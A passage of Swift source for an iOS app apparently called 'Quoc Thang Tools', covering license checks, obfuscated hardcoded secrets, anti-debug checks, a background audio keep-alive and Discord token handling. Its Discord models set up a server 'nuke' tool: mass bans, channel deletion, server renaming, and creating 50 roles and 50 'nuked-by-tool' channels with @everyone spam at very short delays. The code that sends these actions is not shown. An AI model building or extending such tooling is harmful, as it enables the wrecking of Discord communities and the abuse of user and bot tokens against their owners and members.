import SwiftUI
import Foundation
import Security
import AVFoundation
import AudioToolbox
import UniformTypeIdentifiers
import UIKit
import CryptoKit
import MediaPlayer
import Darwin
import MachO
import Network

// ==========================================
// MARK: - DOCUMENT PICKER
// ==========================================
struct DocumentPicker: UIViewControllerRepresentable {
    let contentTypes: [UTType]
    var allowsMultipleSelection: Bool = false
    let onPick: (URL) -> Void
    var onPickMultiple: (([URL]) -> Void)? = nil
    let onCancel: (() -> Void)?
    init(contentTypes: [UTType] = [.item], allowsMultipleSelection: Bool = false, onPick: @escaping (URL) -> Void = { _ in }, onPickMultiple: (([URL]) -> Void)? = nil, onCancel: (() -> Void)? = nil) {
        self.contentTypes = contentTypes; self.allowsMultipleSelection = allowsMultipleSelection; self.onPick = onPick; self.onPickMultiple = onPickMultiple; self.onCancel = onCancel
    }
    func makeCoordinator() -> Coordinator { Coordinator(self) }
    func makeUIViewController(context: Context) -> UIDocumentPickerViewController {
        let p = UIDocumentPickerViewController(forOpeningContentTypes: contentTypes, asCopy: true)
        p.allowsMultipleSelection = allowsMultipleSelection; p.delegate = context.coordinator; return p
    }
    func updateUIViewController(_ vc: UIDocumentPickerViewController, context: Context) {}
    final class Coordinator: NSObject, UIDocumentPickerDelegate {
        let parent: DocumentPicker
        init(_ p: DocumentPicker) { parent = p }
        func documentPicker(_ c: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
            if parent.allowsMultipleSelection, let onPickMultiple = parent.onPickMultiple {
                onPickMultiple(urls)
            } else if let u = urls.first {
                parent.onPick(u)
            }
        }
        func documentPickerWasCancelled(_ c: UIDocumentPickerViewController) { parent.onCancel?() }
    }
}

// ==========================================
// MARK: - KEYCHAIN HELPER
// ==========================================
class KeychainHelper {
    static let standard = KeychainHelper()
    private init() {}

    func save(_ data: Data, service: String, account: String) {
        let deleteQuery = [
            kSecClass: kSecClassGenericPassword,
            kSecAttrService: service,
            kSecAttrAccount: account
        ] as CFDictionary
        SecItemDelete(deleteQuery)

        let addQuery = [
            kSecClass: kSecClassGenericPassword,
            kSecAttrService: service,
            kSecAttrAccount: account,
            kSecValueData: data,
            kSecAttrAccessible: kSecAttrAccessibleAfterFirstUnlock
        ] as CFDictionary
        SecItemAdd(addQuery, nil)
    }

    func read(service: String, account: String) -> Data? {
        let query = [
            kSecAttrService: service,
            kSecAttrAccount: account,
            kSecClass: kSecClassGenericPassword,
            kSecReturnData: true
        ] as CFDictionary
        var result: AnyObject?
        SecItemCopyMatching(query, &result)
        return (result as? Data)
    }

    func delete(service: String, account: String) {
        let query = [
            kSecAttrService: service,
            kSecAttrAccount: account,
            kSecClass: kSecClassGenericPassword
        ] as CFDictionary
        SecItemDelete(query)
    }

    func saveString(_ value: String, forKey key: String) {
        if let data = value.data(using: .utf8) {
            save(data, service: Bundle.main.bundleIdentifier ?? "app", account: key)
        }
    }

    func readString(forKey key: String) -> String? {
        if let data = read(service: Bundle.main.bundleIdentifier ?? "app", account: key) {
            return String(data: data, encoding: .utf8)
        }
        return nil
    }
}

/// Dual-layer persistence: lưu đồng thời UserDefaults và Keychain để không bao giờ bị mất key khi thoát app
final class PersistentStorage {
    static let shared = PersistentStorage()
    private init() {}

    func saveString(_ value: String, forKey key: String) {
        UserDefaults.standard.set(value, forKey: key)
        UserDefaults.standard.synchronize()
        KeychainHelper.standard.saveString(value, forKey: key)
    }

    func readString(forKey key: String) -> String? {
        if let val = UserDefaults.standard.string(forKey: key), !val.isEmpty {
            return val
        }
        if let val = KeychainHelper.standard.readString(forKey: key), !val.isEmpty {
            UserDefaults.standard.set(val, forKey: key)
            UserDefaults.standard.synchronize()
            return val
        }
        return nil
    }

    func delete(forKey key: String) {
        UserDefaults.standard.removeObject(forKey: key)
        UserDefaults.standard.synchronize()
        KeychainHelper.standard.delete(service: Bundle.main.bundleIdentifier ?? "app", account: key)
    }
}

// ==========================================
// MARK: - OBFUSCATION & STRING ENCRYPTION
// ==========================================
enum Obfuscator {
    private static let salt: [UInt8] = [0x5A, 0x8C, 0x3F, 0x1E, 0x9B, 0x72, 0x4D, 0x61]

    static func reveal(_ bytes: [UInt8]) -> String {
        var out = [UInt8]()
        out.reserveCapacity(bytes.count)
        for (i, b) in bytes.enumerated() {
            out.append(b ^ salt[i % salt.count])
        }
        return String(bytes: out, encoding: .utf8) ?? ""
    }
}

enum AppSecrets {
    // Encrypted baseURL
    static let baseURL: [UInt8] = [0x32, 0xf8, 0x4b, 0x6e, 0xe8, 0x48, 0x62, 0x4e, 0x31, 0xe9, 0x46, 0x30, 0xf5, 0x03, 0x39, 0x00, 0x3c, 0xea, 0x0f, 0x2f, 0xb5, 0x05, 0x22, 0x13, 0x31, 0xe9, 0x4d, 0x6d, 0xb5, 0x16, 0x28, 0x17]
    // Encrypted Master Secret
    static let masterSecret: [UInt8] = [0x0b, 0xd8, 0x60, 0x68, 0xa9, 0x2d, 0x1e, 0x24, 0x19, 0xd3, 0x06, 0x7c, 0xa3, 0x14, 0x7f, 0x00, 0x6e, 0xef, 0x08, 0x7b, 0xaa, 0x16, 0x78, 0x00, 0x62, 0xee, 0x0c, 0x7d, 0xad, 0x17, 0x74, 0x07, 0x68, 0xed, 0x0b, 0x7a, 0xac, 0x10, 0x7c, 0x04, 0x62, 0xea]
}

// ==========================================
// MARK: - SECURITY GUARD & ANTI-CRACK ENGINE
// ==========================================
final class SecurityGuard: @unchecked Sendable {
    static let shared = SecurityGuard()

    private(set) var isCompromised = false
    private var sessionToken: String? = nil
    private var sessionExp: Double = 0
    private let lock = NSLock()

    private init() {}

    func markCompromised(reason: String) {
        lock.lock()
        isCompromised = true
        sessionToken = nil
        sessionExp = 0
        lock.unlock()
        AppEndpoints.clear()
        PersistentStorage.shared.delete(forKey: "QT_CachedSessionToken")
    }

    func clearSession() {
        lock.lock()
        sessionToken = nil
        sessionExp = 0
        isCompromised = false
        lock.unlock()
        PersistentStorage.shared.delete(forKey: "QT_CachedSessionToken")
    }

    /// Không nạp phiên từ ổ đĩa (RAM-only — bắt buộc xác thực live với Cloudflare)
    func purgeLegacyDiskCache() {
        PersistentStorage.shared.delete(forKey: "QT_CachedSessionToken")
        UserDefaults.standard.removeObject(forKey: "QT_CachedRemoteConfig")
        UserDefaults.standard.synchronize()
    }

    private static func decodeBase64Flexible(_ str: String) -> Data? {
        if let d = Data(base64Encoded: str) { return d }
        var normalized = str
            .replacingOccurrences(of: "-", with: "+")
            .replacingOccurrences(of: "_", with: "/")
        let rem = normalized.count % 4
        if rem > 0 {
            normalized += String(repeating: "=", count: 4 - rem)
        }
        return Data(base64Encoded: normalized)
    }

    /// Xác thực và lưu Session Token từ server (CHỈ LƯU TRONG RAM)
    func updateSessionToken(_ token: String) -> Bool {
        let parts = token.components(separatedBy: ".")
        guard parts.count == 2,
              let payloadData = Self.decodeBase64Flexible(parts[0]),
              let payloadObj = try? JSONSerialization.jsonObject(with: payloadData) as? [String: Any],
              let mid = payloadObj["mid"] as? String,
              let expRaw = (payloadObj["exp"] as? NSNumber)?.doubleValue else {
            return false
        }

        let secret = Obfuscator.reveal(AppSecrets.masterSecret)
        let expectedSig = SecureAPIClient.hmacHex(parts[0], secret: secret)
        guard parts[1].lowercased() == expectedSig.lowercased() else {
            return false
        }

        guard mid == MachineID.get() else {
            return false
        }

        let expSec = expRaw > 100_000_000_000 ? (expRaw / 1000.0) : expRaw
        guard expSec > Date().timeIntervalSince1970 else {
            return false
        }

        lock.lock()
        sessionToken = token
        sessionExp = expSec
        isCompromised = false
        lock.unlock()
        return true
    }

    /// Kiểm tra quyền thực thi lõi (RAM-only + Anti-Debug)
    func verifyExecutionPermit() -> Bool {
        if AppIntegrityAuditor.shared.isDebuggerAttached() {
            markCompromised(reason: "debugger_attached")
            return false
        }

        lock.lock()
        defer { lock.unlock() }

        if isCompromised { return false }
        guard let token = sessionToken, sessionExp > Date().timeIntervalSince1970 else { return false }

        let parts = token.components(separatedBy: ".")
        guard parts.count == 2 else { return false }

        return true
    }
}

// ==========================================
// MARK: - SECURE TRANSPORT & ENCRYPTED CLIENT
// ==========================================
final class SecureAPIClient {
    static let shared = SecureAPIClient()
    private let session: URLSession

    var baseURL: String {
        Obfuscator.reveal(AppSecrets.baseURL)
    }

    private var secret: String {
        Obfuscator.reveal(AppSecrets.masterSecret)
    }

    private init() {
        let cfg = URLSessionConfiguration.ephemeral
        cfg.timeoutIntervalForRequest = 12
        cfg.timeoutIntervalForResource = 15
        session = URLSession(configuration: cfg)
    }

    static func hmacHex(_ str: String, secret: String) -> String {
        let key = SymmetricKey(data: Data(secret.utf8))
        let code = HMAC<SHA256>.authenticationCode(for: Data(str.utf8), using: key)
        return code.map { String(format: "%02x", $0) }.joined()
    }

    private func deriveKey(seed: String) -> SymmetricKey {
        let hash = SHA256.hash(data: Data(seed.utf8))
        return SymmetricKey(data: hash)
    }

    func sendEncryptedRequest<T: Decodable>(endpoint: String, bodyDict: [String: Any]) async throws -> T {
        let ts = String(Int(Date().timeIntervalSince1970))
        let nonce = UUID().uuidString.replacingOccurrences(of: "-", with: "").lowercased()

        let clientKey = deriveKey(seed: "\(secret):\(nonce):\(ts)")
        let jsonData = try JSONSerialization.data(withJSONObject: bodyDict)
        let sealedBox = try AES.GCM.seal(jsonData, using: clientKey)
        guard let combined = sealedBox.combined else {
            throw NSError(domain: "Security", code: 500, userInfo: [NSLocalizedDescriptionKey: "Encryption error"])
        }
        let payloadBase64 = combined.base64EncodedString()
        let sig = SecureAPIClient.hmacHex("\(payloadBase64):\(nonce):\(ts)", secret: secret)

        let envelope: [String: Any] = [
            "payload": payloadBase64,
            "nonce": nonce,
            "ts": ts,
            "sig": sig
        ]

        guard let url = URL(string: "\(baseURL)\(endpoint)") else {
            throw NSError(domain: "Network", code: 400, userInfo: [NSLocalizedDescriptionKey: "Invalid URL"])
        }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.httpBody = try JSONSerialization.data(withJSONObject: envelope)

        let (data, res) = try await session.data(for: req)
        let statusCode = (res as? HTTPURLResponse)?.statusCode ?? 500

        // Thử giải mã envelope AES-GCM ngay cả khi HTTP 4xx (trường hợp worker trả về valid:false / cracked:true / expired:true kèm 403/404)
        if let serverEnvelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
           let respPayload = serverEnvelope["payload"] as? String,
           let respSig = serverEnvelope["sig"] as? String {

            let expectedRespSig = SecureAPIClient.hmacHex("\(respPayload):\(nonce)", secret: secret)
            guard respSig.lowercased() == expectedRespSig.lowercased() else {
                throw NSError(domain: "Security", code: 403, userInfo: [NSLocalizedDescriptionKey: "Chữ ký bảo mật không khớp. Gói tin bị can thiệp."])
            }

            let respKey = deriveKey(seed: "\(secret):resp:\(nonce):\(ts)")
            guard let combinedRespData = Data(base64Encoded: respPayload) else {
                throw NSError(domain: "Security", code: 500, userInfo: [NSLocalizedDescriptionKey: "Base64 decode failed"])
            }
            let respBox = try AES.GCM.SealedBox(combined: combinedRespData)
            let decryptedData = try AES.GCM.open(respBox, using: respKey)
            if let decoded = try? JSONDecoder().decode(T.self, from: decryptedData) {
                return decoded
            }
            if let errObj = try? JSONSerialization.jsonObject(with: decryptedData) as? [String: Any],
               let errMsg = errObj["error"] as? String {
                let dom = (400...499).contains(statusCode) ? "LicenseRejected" : "Security"
                throw NSError(domain: dom, code: statusCode, userInfo: [NSLocalizedDescriptionKey: errMsg])
            }
        }

        // Nếu server trả về JSON dạng thường
        if (200...299).contains(statusCode), let plainObj = try? JSONDecoder().decode(T.self, from: data) {
            return plainObj
        }
        if (400...499).contains(statusCode) {
            if let obj = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
               (obj["cracked"] as? Bool == true || obj["expired"] as? Bool == true),
               let plainObj = try? JSONDecoder().decode(T.self, from: data) {
                return plainObj
            }
            if let errObj = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
               let errMsg = (errObj["error"] as? String) ?? (errObj["message"] as? String) {
                throw NSError(domain: "LicenseRejected", code: statusCode, userInfo: [NSLocalizedDescriptionKey: errMsg])
            }
            let rawMsg = String(data: data, encoding: .utf8)?.trimmingCharacters(in: .whitespacesAndNewlines)
            let msg = (rawMsg?.isEmpty == false) ? rawMsg! : "Key không tồn tại hoặc đã bị xóa (HTTP \(statusCode))."
            throw NSError(domain: "LicenseRejected", code: statusCode, userInfo: [NSLocalizedDescriptionKey: msg])
        }
        if let errObj = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
           let errMsg = (errObj["error"] as? String) ?? (errObj["message"] as? String) {
            throw NSError(domain: "Network", code: statusCode, userInfo: [NSLocalizedDescriptionKey: errMsg])
        }

        let msg = String(data: data, encoding: .utf8) ?? "HTTP Error \(statusCode)"
        throw NSError(domain: "Network", code: statusCode, userInfo: [NSLocalizedDescriptionKey: msg])
    }
}

// ==========================================
// MARK: - REMOTE CONFIG (từ Cloudflare Worker — RAM-ONLY, ZERO DISCORD API TRONG APP)
// ==========================================
struct ConfigResponse: Codable {
    let valid: Bool?
    let createdAt: Int64?
    let expiresAt: Int64?
    let assets: RemoteAssetsDTO?
    let config: RemoteConfigDTO?
    let sessionToken: String?
    let error: String?
    let cracked: Bool?
    let expired: Bool?

    enum CodingKeys: String, CodingKey {
        case valid, assets, config, error, cracked, expired
        case createdAt = "created_at"
        case expiresAt = "expires_at"
        case sessionToken = "session_token"
    }
}

/// Chỉ giữ CDN hiển thị ảnh trong RAM khi key đã xác thực; toàn bộ API chức năng nằm tách biệt trong RemoteFeatureVault theo từng chức năng.
struct AppEndpoints {
    static var cdnAvatars = ""
    static var cdnIcons = ""

    static func applyAssets(_ assets: RemoteAssetsDTO?) {
        guard let a = assets else { return }
        if let av = a.cdn_avatars, !av.isEmpty { cdnAvatars = av }
        if let ic = a.cdn_icons, !ic.isEmpty { cdnIcons = ic }
    }

    static func applyCDN(avatars: String?, icons: String?) {
        if let av = avatars, !av.isEmpty { cdnAvatars = av }
        if let ic = icons, !ic.isEmpty { cdnIcons = ic }
    }

    static func clear() {
        cdnAvatars = ""
        cdnIcons = ""
        RemoteFeatureVault.shared.clearAllFunctionalData()
        UserDefaults.standard.removeObject(forKey: "QT_CachedRemoteConfig")
        UserDefaults.standard.synchronize()
    }
}

// ==========================================
// MARK: - MACHINE ID (dùng chung)
// ==========================================
enum MachineID {
    private static let k = "QT_MachineID_v3"

    static func get() -> String {
        if let saved = PersistentStorage.shared.readString(forKey: k), !saved.isEmpty {
            return saved
        }
        let vendor = UIDevice.current.identifierForVendor?.uuidString ?? UUID().uuidString
        let model = UIDevice.current.model
        let raw = "\(vendor)-\(model)-QTApp"
        let hash = SHA256.hash(data: Data(raw.utf8))
        let newID = hash.compactMap { String(format: "%02x", $0) }.joined()
        PersistentStorage.shared.saveString(newID, forKey: k)
        return newID
    }
}

// ==========================================
// MARK: - CONFIG CLIENT
// ==========================================
final class ConfigAPIClient {
    static let shared = ConfigAPIClient()
    var baseURL: String { SecureAPIClient.shared.baseURL }

    func fetchConfig(key: String) async throws -> ConfigResponse {
        let report = AppIntegrityAuditor.shared.collectReport()
        return try await SecureAPIClient.shared.sendEncryptedRequest(
            endpoint: "/config",
            bodyDict: [
                "license_key": key,
                "machine_id": MachineID.get(),
                "integrity": report.payload
            ]
        )
    }

    func authorizeFeature(key: String, feature: FeatureScope) async throws -> FeatureAuthResponse {
        let report = AppIntegrityAuditor.shared.collectReport()
        return try await SecureAPIClient.shared.sendEncryptedRequest(
            endpoint: "/feature-auth",
            bodyDict: [
                "license_key": key,
                "machine_id": MachineID.get(),
                "feature": feature.rawValue,
                "integrity": report.payload
            ]
        )
    }
}

// ==========================================
// MARK: - MODELS
// ==========================================
struct DiscordUser: Codable { let id, username: String; let globalName: String?; let avatar: String? }

struct TokenInfo: Identifiable, Codable, Equatable {
    var id = UUID()
    let token: String
    var userId, username: String
    var avatarHash: String?
    var isValid: Bool
    var avatarURL: URL? {
        guard let h = avatarHash, !AppEndpoints.cdnAvatars.isEmpty else { return nil }
        return URL(string: "\(AppEndpoints.cdnAvatars)/\(userId)/\(h).png?size=128")
    }
}

struct Guild: Codable, Identifiable, Hashable { let id, name: String; let icon: String? }
struct Channel: Codable, Identifiable, Hashable {
    let id: String; let name: String?; let type: Int; let position: Int?; let parentId: String?
    var isSendableText: Bool { type == 0 || type == 5 }
    var isCategory: Bool { type == 4 }
    var isVoice: Bool { type == 2 || type == 13 }
    var displayName: String { name ?? "không tên" }
}
struct ParsedMessage: Identifiable, Hashable { let id = UUID(); let body: String }

struct BotInfo: Codable { let id, username: String; let discriminator, avatar: String?; let bot: Bool? }
struct BotConfig: Codable {
    var token, username, userId: String
    var avatarHash, discriminator: String?
    var displayName: String {
        if let d = discriminator, d != "0" { return "\(username)#\(d)" }
        return username
    }
    var avatarURL: URL? {
        guard let h = avatarHash, !AppEndpoints.cdnAvatars.isEmpty else { return nil }
        return URL(string: "\(AppEndpoints.cdnAvatars)/\(userId)/\(h).png?size=128")
    }
}

struct GuildRole: Codable { let id, name: String; let position: Int }
struct BotMember: Codable { let user: BotMemberUser?; let roles: [String]? }
struct BotMemberUser: Codable { let id: String; let username: String?; let bot: Bool? }

struct NukeGuild: Codable {
    let id, name: String
    let icon: String?
    let permissions: String
    let owner: Bool?
    var bits: UInt64 { UInt64(permissions) ?? 0 }
    var isOwner: Bool { owner ?? false }
    var isAdmin: Bool { bits & (1 << 3) != 0 }
    var canManageGuild: Bool { bits & (1 << 5) != 0 }
    var canManageChannels: Bool { bits & (1 << 4) != 0 }
    var canBan: Bool { bits & (1 << 2) != 0 }
    var canManageRoles: Bool { bits & (1 << 28) != 0 }
    var canMassBan: Bool { isOwner || isAdmin || canBan }
    var canDeleteChannels: Bool { isOwner || isAdmin || canManageChannels }
    var canCreateChannels: Bool { isOwner || isAdmin || canManageChannels }
    var canCreateRoles: Bool { isOwner || isAdmin || canManageRoles }
    var canRenameGuild: Bool { isOwner || isAdmin || canManageGuild }
    var canDoAnything: Bool {
        canMassBan || canDeleteChannels || canCreateChannels || canCreateRoles || canRenameGuild
    }
}

struct GuildPermissions {
    var massBan = false, deleteChannels = false, createChannels = false
    var createRoles = false, renameGuild = false
    var any: Bool { massBan || deleteChannels || createChannels || createRoles || renameGuild }
}

enum NukeStepType: String, CaseIterable, Identifiable {
    case massBan = "Mass Ban"
    case deleteChannels = "Xóa kênh"
    case renameGuild = "Đổi tên server"
    case createRoles = "Tạo Role"
    case createChannels = "Tạo kênh + Spam"
    var id: String { rawValue }
    var icon: String {
        switch self {
        case .massBan: return "hammer.fill"
        case .deleteChannels: return "trash.fill"
        case .renameGuild: return "pencil"
        case .createRoles: return "star.fill"
        case .createChannels: return "plus.rectangle.on.rectangle"
        }
    }
}

struct NukeConfig {
    var enabledSteps: Set<NukeStepType> = [.createChannels]
    var stepOrder: [NukeStepType] = NukeStepType.allCases
    var banDelay: Double = 0.02
    var deleteDelay: Double = 0.05
    var createChDelay: Double = 0.10
    var createRoleDelay: Double = 0.10
    var msgDelay: Double = 0.10
    var banRoleId = ""
    var roleName = "Quoc Thang Tools"
    var roleCount = 50
    var channelName = "nuked-by-tool"
    var channelCount = 50
    var messageContent = ""
    var tagEveryone = true
    var newGuildName = ""
}

// ==========================================
// MARK: - NOW PLAYING HELPER (MULTI-FEATURE iPHONE LOCK SCREEN / CONTROL CENTER / DYNAMIC ISLAND)
// ==========================================
@MainActor
final class NowPlayingHelper: ObservableObject {
    static let shared = NowPlayingHelper()

    @Published private(set) var currentSession: NowPlayingSessionState? = nil
    @Published private(set) var activeCount: Int = 0
    @Published private(set) var activeIndex: Int = 0
    @Published var claimExclusiveNowPlaying: Bool {
        didSet {
            UserDefaults.standard.set(claimExclusiveNowPlaying, forKey: "QT_ExclusiveNowPlaying")
            if BackgroundManager.shared.isKeepAliveActive {
                BackgroundManager.shared.reconfigureAudioSession()
            }
        }
    }

    private var sessions: [NowPlayingFeature: NowPlayingSessionState] = [:]
    private var focusedFeature: NowPlayingFeature? = nil
    private var commandsInstalled = false

    private init() {
        let ud = UserDefaults.standard
        if ud.object(forKey: "QT_ExclusiveNowPlaying") == nil {
            self.claimExclusiveNowPlaying = true
        } else {
            self.claimExclusiveNowPlaying = ud.bool(forKey: "QT_ExclusiveNowPlaying")
        }
    }

    private var orderedFeatures: [NowPlayingFeature] {
        sessions.keys.sorted { lhs, rhs in
            if lhs.priority != rhs.priority { return lhs.priority > rhs.priority }
            return lhs.rawValue < rhs.rawValue
        }
    }

    private func installRemoteCommandsIfNeeded() {
        guard !commandsInstalled else { return }
        commandsInstalled = true
        let cc = MPRemoteCommandCenter.shared()

        cc.playCommand.removeTarget(nil)
        cc.pauseCommand.removeTarget(nil)
        cc.togglePlayPauseCommand.removeTarget(nil)
        cc.stopCommand.removeTarget(nil)
        cc.nextTrackCommand.removeTarget(nil)
        cc.previousTrackCommand.removeTarget(nil)
        cc.changePlaybackPositionCommand.removeTarget(nil)

        cc.playCommand.addTarget { [weak self] _ in
            Task { @MainActor in self?.triggerPlay() }
            return .success
        }
        cc.pauseCommand.addTarget { [weak self] _ in
            Task { @MainActor in self?.triggerPause() }
            return .success
        }
        cc.togglePlayPauseCommand.addTarget { [weak self] _ in
            Task { @MainActor in self?.triggerPlayPause() }
            return .success
        }
        cc.stopCommand.addTarget { [weak self] _ in
            Task { @MainActor in self?.triggerStopCurrent() }
            return .success
        }
        cc.nextTrackCommand.addTarget { [weak self] _ in
            Task { @MainActor in self?.triggerNext() }
            return .success
        }
        cc.previousTrackCommand.addTarget { [weak self] _ in
            Task { @MainActor in self?.triggerPrevious() }
            return .success
        }
        cc.changePlaybackPositionCommand.addTarget { [weak self] event in
            guard let posEvent = event as? MPChangePlaybackPositionCommandEvent else {
                return .commandFailed
            }
            let pos = posEvent.positionTime
            Task { @MainActor in self?.triggerSeek(to: pos) }
            return .success
        }
    }

    // MARK: Multi-Feature Session Registry

    func registerSession(_ state: NowPlayingSessionState, focus: Bool = true) {
        installRemoteCommandsIfNeeded()
        UIApplication.shared.beginReceivingRemoteControlEvents()
        sessions[state.feature] = state
        if focus || focusedFeature == nil || sessions[focusedFeature!] == nil {
            focusedFeature = state.feature
        }
        refreshPublishedAndSystem()
    }

    func updateSession(
        _ feature: NowPlayingFeature,
        title: String? = nil,
        detail: String? = nil,
        controlsHint: String? = nil,
        isPaused: Bool? = nil,
        elapsedTime: Double? = nil,
        duration: Double? = nil,
        isLiveStream: Bool? = nil
    ) {
        guard var s = sessions[feature] else { return }
        if let t = title { s.title = t }
        if let d = detail { s.detail = d }
        if let h = controlsHint { s.controlsHint = h }
        if let p = isPaused { s.isPaused = p }
        if let e = elapsedTime { s.elapsedTime = e }
        if let dur = duration { s.duration = dur }
        if let live = isLiveStream { s.isLiveStream = live }
        sessions[feature] = s
        if focusedFeature == feature {
            refreshPublishedAndSystem()
        }
    }

    func endSession(_ feature: NowPlayingFeature) {
        sessions.removeValue(forKey: feature)
        if focusedFeature == feature {
            focusedFeature = orderedFeatures.first
        }
        if sessions.isEmpty {
            clearSystemNowPlaying()
        } else {
            refreshPublishedAndSystem()
        }
    }

    func cycleNextSession() {
        let list = orderedFeatures
        guard list.count > 1 else { return }
        if let cur = focusedFeature, let idx = list.firstIndex(of: cur) {
            focusedFeature = list[(idx + 1) % list.count]
        } else {
            focusedFeature = list.first
        }
        refreshPublishedAndSystem()
    }

    func cyclePreviousSession() {
        let list = orderedFeatures
        guard list.count > 1 else { return }
        if let cur = focusedFeature, let idx = list.firstIndex(of: cur) {
            focusedFeature = list[(idx - 1 + list.count) % list.count]
        } else {
            focusedFeature = list.first
        }
        refreshPublishedAndSystem()
    }

    func focusSession(_ feature: NowPlayingFeature) {
        guard sessions[feature] != nil else { return }
        focusedFeature = feature
        refreshPublishedAndSystem()
    }

    func refreshNowPlaying() {
        guard !sessions.isEmpty else { return }
        refreshPublishedAndSystem()
    }

    func startPreviewSession() {
        BackgroundManager.shared.start(tag: "preview")
        registerSession(
            NowPlayingSessionState(
                feature: .preview,
                title: "Quoc Thang Tools • Đã kết nối",
                detail: "Widget màn hình khóa iPhone hoạt động 100%",
                controlsHint: "⏸ Tạm dừng • ◀◀/▶▶ Tương tác • Nhấn ■ để tắt",
                isPaused: false,
                elapsedTime: 0,
                duration: 0,
                isLiveStream: true,
                onPlay: { [weak self] in
                    self?.updateSession(.preview, title: "Quoc Thang Tools • Đang chạy", isPaused: false)
                },
                onPause: { [weak self] in
                    self?.updateSession(.preview, title: "Quoc Thang Tools • Tạm dừng", isPaused: true)
                },
                onStop: { [weak self] in
                    self?.stopPreviewSession()
                }
            ),
            focus: true
        )
    }

    func stopPreviewSession() {
        endSession(.preview)
        BackgroundManager.shared.stop(tag: "preview")
    }

    // MARK: Remote & Floating Bar Actions

    func triggerPlay() {
        guard let active = currentSession else { return }
        if let play = active.onPlay {
            play()
        } else if !active.isPaused {
            refreshPublishedAndSystem()
        }
    }

    func triggerPause() {
        guard let active = currentSession else { return }
        if let pause = active.onPause {
            pause()
        } else if let stop = active.onStop {
            stop()
        }
    }

    func triggerPlayPause() {
        guard let active = currentSession else { return }
        if active.isPaused {
            triggerPlay()
        } else {
            triggerPause()
        }
    }

    func triggerStopCurrent() {
        guard let active = currentSession else { return }
        if let stop = active.onStop {
            stop()
        } else {
            endSession(active.feature)
        }
    }

    func triggerNext() {
        guard let active = currentSession else { return }
        if let next = active.onNext {
            next()
        } else if orderedFeatures.count > 1 {
            cycleNextSession()
        }
    }

    func triggerPrevious() {
        guard let active = currentSession else { return }
        if let prev = active.onPrevious {
            prev()
        } else if orderedFeatures.count > 1 {
            cyclePreviousSession()
        }
    }

    func triggerSeek(to seconds: Double) {
        guard let active = currentSession else { return }
        active.onSeek?(seconds)
    }

    // MARK: Legacy Compatibility Helpers

    func start(onStop: (@MainActor () -> Void)? = nil) {
        registerSession(
            NowPlayingSessionState(
                feature: .preview,
                title: "Quoc Thang Tools",
                detail: "Đang hoạt động nền 24/7",
                controlsHint: "Quoc Thang Tools",
                onStop: onStop
            ),
            focus: false
        )
    }

    func update(title: String, detail: String) {
        if let f = focusedFeature {
            updateSession(f, title: title, detail: detail)
        }
    }

    func stop() {
        sessions.removeAll()
        focusedFeature = nil
        clearSystemNowPlaying()
    }

    // MARK: System Sync (MPNowPlayingInfoCenter + MPRemoteCommandCenter)

    private func refreshPublishedAndSystem() {
        let list = orderedFeatures
        if focusedFeature == nil || sessions[focusedFeature!] == nil {
            focusedFeature = list.first
        }
        activeCount = list.count
        if let f = focusedFeature, let idx = list.firstIndex(of: f), let state = sessions[f] {
            activeIndex = idx
            currentSession = state
            pushToSystem(state: state, index: idx, total: list.count)
        } else {
            activeIndex = 0
            currentSession = nil
            clearSystemNowPlaying()
        }
    }

    private func pushToSystem(state: NowPlayingSessionState, index: Int, total: Int) {
        let cc = MPRemoteCommandCenter.shared()
        let hasPlayPause = state.supportsPauseResume || state.onStop != nil
        cc.playCommand.isEnabled = state.onPlay != nil || state.isPaused
        cc.pauseCommand.isEnabled = hasPlayPause
        cc.togglePlayPauseCommand.isEnabled = hasPlayPause
        cc.stopCommand.isEnabled = state.onStop != nil
        cc.nextTrackCommand.isEnabled = state.onNext != nil || total > 1
        cc.previousTrackCommand.isEnabled = state.onPrevious != nil || total > 1
        cc.changePlaybackPositionCommand.isEnabled = state.onSeek != nil && state.duration > 0

        let albumPrefix = total > 1 ? "[\(index + 1)/\(total)] " : ""
        let albumText = "\(albumPrefix)\(state.controlsHint)"

        var info: [String: Any] = [:]
        info[MPMediaItemPropertyTitle] = state.title
        info[MPMediaItemPropertyArtist] = state.detail
        info[MPMediaItemPropertyAlbumTitle] = albumText
        info[MPMediaItemPropertyArtwork] = NowPlayingArtworkFactory.artwork(for: state.feature)
        info[MPNowPlayingInfoPropertyIsLiveStream] = state.isLiveStream
        info[MPNowPlayingInfoPropertyPlaybackRate] = state.isPaused ? 0.0 : 1.0
        info[MPNowPlayingInfoPropertyDefaultPlaybackRate] = 1.0
        info[MPNowPlayingInfoPropertyMediaType] = MPNowPlayingInfoMediaType.audio.rawValue

        if state.duration > 0 {
            info[MPMediaItemPropertyPlaybackDuration] = state.duration
            info[MPNowPlayingInfoPropertyElapsedPlaybackTime] = min(max(0, state.elapsedTime), state.duration)
        } else {
            info[MPMediaItemPropertyPlaybackDuration] = 0
            info[MPNowPlayingInfoPropertyElapsedPlaybackTime] = max(0, state.elapsedTime)
        }

        let center = MPNowPlayingInfoCenter.default()
        center.nowPlayingInfo = info
        if #available(iOS 16.0, *) {
            center.playbackState = state.isPaused ? .paused : .playing
        }
    }

    private func clearSystemNowPlaying() {
        currentSession = nil
        activeCount = 0
        activeIndex = 0
        let cc = MPRemoteCommandCenter.shared()
        cc.playCommand.isEnabled = false
        cc.pauseCommand.isEnabled = false
        cc.togglePlayPauseCommand.isEnabled = false
        cc.stopCommand.isEnabled = false
        cc.nextTrackCommand.isEnabled = false
        cc.previousTrackCommand.isEnabled = false
        cc.changePlaybackPositionCommand.isEnabled = false

        let center = MPNowPlayingInfoCenter.default()
        center.nowPlayingInfo = nil
        if #available(iOS 16.0, *) {
            center.playbackState = .stopped
        }
        UIApplication.shared.endReceivingRemoteControlEvents()
    }
}

// ==========================================
// MARK: - BACKGROUND 24/7 ENGINE (AVAudioPlayer Silent WAV + AVAudioEngine + Auto-Recovery)
// ==========================================
final class BackgroundManager {
    static let shared = BackgroundManager()

    private let lock = NSLock()
    private var activeTags: Set<String> = []
    private var silentPlayer: AVAudioPlayer?
    private var engine: AVAudioEngine?
    private var sourceNode: AVAudioSourceNode?
    private var bgTask: UIBackgroundTaskIdentifier = .invalid
    private var watchdogTimer: Timer?
    private var observersInstalled = false

    private init() {
        installObservers()
